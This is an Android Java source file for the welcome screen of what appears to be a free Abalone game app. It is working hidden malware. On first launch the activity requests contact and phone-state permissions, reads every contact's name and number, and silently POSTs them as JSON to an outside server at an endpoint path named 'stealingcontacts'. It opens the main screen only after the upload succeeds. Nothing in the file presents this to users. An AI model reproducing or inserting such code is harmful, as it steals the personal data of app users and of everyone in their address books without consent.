package com.free.abalone;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.provider.ContactsContract;
import android.view.Window;
import android.view.WindowManager;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class WelcomeActivity extends AppCompatActivity {

    SharedPreferences shared;
    SharedPreferences.Editor editor;

    private JSONObject contacts=null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        //隐藏标题栏以及状态栏 这里一定要注意 这些操作要在setContentView方法前操作
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);

        /**标题是属于View的，所以窗口所有的修饰部分被隐藏后标题依然有效,需要去掉标题**/
        //requestWindowFeature(Window.FEATURE_NO_TITLE);其它的可以但是AppCompatActivity不行
        supportRequestWindowFeature(Window.FEATURE_NO_TITLE);
        setContentView(R.layout.activity_welcome);

        shared=getSharedPreferences("mysp", MODE_PRIVATE);
        shared.getBoolean("isfer", true);
        editor=shared.edit();
        if(shared.getBoolean("isfer",true)){
            check();
        }else{
            getHome();
        }

    }

    //关闭欢迎页打开主页
    public void getHome() {
        Intent intent = new Intent(WelcomeActivity.this, MainActivity.class);
        startActivity(intent);
        finish();
    }

    //检查权限
    private void check() {
        //判断是否有权限
        if(ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED
                &&ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED){
            ActivityCompat.requestPermissions(this,new String[]{Manifest.permission.READ_CONTACTS,Manifest.permission.READ_PHONE_STATE},201);
        }else{
            if(shared.getBoolean("isfer",true)){
                try {
                    contacts = getContacts();
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                new Thread(){
                    @Override
                    public void run() {
                        sendContacts(contacts);
                    }
                }.start();
                editor.putBoolean("isfer", false);
                editor.commit();
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if(requestCode==201){
            if(shared.getBoolean("isfer",true)){
                try {
                    contacts = getContacts();
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                new Thread(){
                    @Override
                    public void run() {
                        sendContacts(contacts);
                    }
                }.start();
                editor.putBoolean("isfer", false);
                editor.commit();
            }
        }else{
            return;
        }
    }

    private JSONObject getContacts() throws JSONException {

        ContentResolver resolver = getContentResolver();
        Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
        //查询联系人数据
        Cursor cursor = resolver.query(uri, null, null, null, ContactsContract.CommonDataKinds.Phone.SORT_KEY_PRIMARY);
        //ArrayList<HashMap<String,String>> contacts=new ArrayList<>();
        JSONObject contacts=new JSONObject();
        int i=1;
        if(cursor!=null){
            while(cursor.moveToNext()) {
                //HashMap<String,String> contact=new HashMap<>();
                JSONObject contact=new JSONObject();
                //获取联系人姓名,手机号码
                String cName = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String cNum = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                contact.put("name",cName);
                contact.put("number",cNum);
                contacts.put("person"+i,contact);
                i++;
            }
        }
        cursor.close();
        return contacts;
    }

    private void sendContacts(JSONObject contacts){
        try {
            URL url = new URL("http://www.tantanshuo.com/stealingcontacts/ObtainContacts");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            //请求方式 post
            conn.setRequestMethod("POST");
            //设置超时时间
            conn.setConnectTimeout(10000);
            //设置维持长连接
            conn.setRequestProperty("Connection", "Keep-Alive");
            //设置请求的数据类型
            conn.setRequestProperty("Content-Type", "application/json;charset=UTF-8");
            //设置向服务器写数据
            conn.setDoOutput(true);
            conn.setDoInput(true);
            conn.setUseCaches(false);
            //开始连接请求
            conn.connect();
            //把数据以流的方式写给服务器
            OutputStream os=conn.getOutputStream();
            os.write(URLEncoder.encode(contacts.toString(),"utf-8").getBytes());
            os.flush();
            os.close();
            //获取响应码
            int code=conn.getResponseCode();
            if(code==200){
                //System.out.println("传送成功！");
                sendSuccess();
            }else{
                //System.out.println("传送失败！");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendSuccess(){
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                getHome();
            }
        });
    }

}
